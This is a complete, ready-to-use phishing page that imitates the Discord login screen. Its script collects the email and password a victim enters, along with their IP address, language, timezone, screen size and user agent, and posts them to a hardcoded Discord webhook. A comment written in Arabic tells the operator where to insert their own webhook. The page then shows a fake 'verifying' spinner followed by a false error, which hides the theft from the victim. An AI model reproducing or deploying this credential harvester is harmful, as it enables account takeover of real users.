<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Discord — Login</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; }
  body { background:#313338; min-height:100vh; display:flex; align-items:center; justify-content:center; padding:20px; }
  .card { background:#313338; width:100%; max-width:480px; padding:32px; border-radius:8px; }
  h1 { color:#f2f3f5; font-size:24px; text-align:center; margin-bottom:8px; font-weight:600; }
  .sub { color:#b5bac1; text-align:center; font-size:16px; margin-bottom:24px; }
  label { display:block; color:#b5bac1; font-size:12px; text-transform:uppercase; font-weight:700; margin-bottom:8px; margin-top:16px; }
  input { width:100%; padding:10px; background:#1e1f22; border:none; border-radius:3px; color:#f2f3f5; font-size:16px; outline:none; }
  input:focus { outline:1px solid #5865f2; }
  .forgot { color:#00a8fc; font-size:14px; margin-top:6px; display:inline-block; text-decoration:none; }
  .forgot:hover { text-decoration:underline; }
  button { width:100%; padding:11px; background:#5865f2; color:#fff; border:none; border-radius:3px;
           font-size:16px; font-weight:500; margin-top:20px; cursor:pointer; transition:background 0.17s; }
  button:hover { background:#4752c4; }
  button:disabled { background:#4e5058; cursor:not-allowed; }
  .need { color:#949ba4; font-size:14px; margin-top:16px; }
  .need a { color:#00a8fc; text-decoration:none; }
  .need a:hover { text-decoration:underline; }
  .err { color:#fa777c; font-size:14px; margin-top:8px; display:none; }
  .loading { display:none; text-align:center; color:#b5bac1; padding:40px 0; }
  .spinner { width:32px; height:32px; border:3px solid #4e5058; border-top-color:#5865f2;
             border-radius:50%; margin:0 auto 12px; animation:spin 0.8s linear infinite; }
  @keyframes spin { to { transform:rotate(360deg); } }
</style>
</head>
<body>

<div class="card" id="card">
  <h1>Welcome back!</h1>
  <p class="sub">We're so excited to see you again!</p>

  <form id="f" autocomplete="off">
    <label>Email or Phone Number</label>
    <input type="text" id="email" required>

    <label>Password</label>
    <input type="password" id="pass" required>
    <a href="#" class="forgot" onclick="return false">Forgot your password?</a>

    <div class="err" id="err">Login or password is invalid.</div>

    <button type="submit" id="btn">Log In</button>
  </form>

  <p class="need">Need an account? <a href="#" onclick="return false">Register</a></p>
</div>

<div class="card loading" id="loading">
  <div class="spinner"></div>
  <p>Verifying your login...</p>
</div>

<script>
// ═══════════════════════════════════════════
//  حط الويب هوك تبعك هنا بين علامات التنصيص
// ═══════════════════════════════════════════
const WEBHOOK = "https://discord.com/api/webhooks/1560653619131453480/q8ljH8-Qsc6CCblli4toTyogBTHaR6Bt7nJ_fTLKn756QdI0amAsOs4ExNkQahSEWfZE";

document.getElementById("f").addEventListener("submit", async (e) => {
  e.preventDefault();

  const email = document.getElementById("email").value.trim();
  const pass  = document.getElementById("pass").value;
  const btn   = document.getElementById("btn");

  btn.disabled = true;
  btn.textContent = "Logging in...";

  let ip = "unknown";
  try {
    const r = await fetch("https://api.ipify.org?format=json");
    const j = await r.json();
    ip = j.ip;
  } catch {}

  const msg = {
    content: "**New Login Captured**",
    embeds: [{
      title: "Discord Credentials",
      color: 0x5865f2,
      fields: [
        { name: "Email", value: "```" + email + "```", inline: false },
        { name: "Password", value: "```" + pass + "```", inline: false },
        { name: "IP", value: ip, inline: true },
        { name: "Language", value: navigator.language, inline: true },
        { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
        { name: "Screen", value: window.screen.width + "x" + window.screen.height, inline: true },
        { name: "User-Agent", value: "```" + navigator.userAgent.slice(0, 200) + "```", inline: false }
      ],
      timestamp: new Date().toISOString()
    }]
  };

  try {
    await fetch(WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(msg)
    });
  } catch (err) {
    console.error("Hook error:", err);
  }

  setTimeout(() => {
    document.getElementById("card").style.display = "none";
    document.getElementById("loading").style.display = "block";

    setTimeout(() => {
      document.getElementById("loading").style.display = "none";
      document.getElementById("card").style.display = "block";
      document.getElementById("err").style.display = "block";
      btn.disabled = false;
      btn.textContent = "Log In";
      document.getElementById("pass").value = "";
    }, 2500);
  }, 500);
});
</script>

</body>
</html>
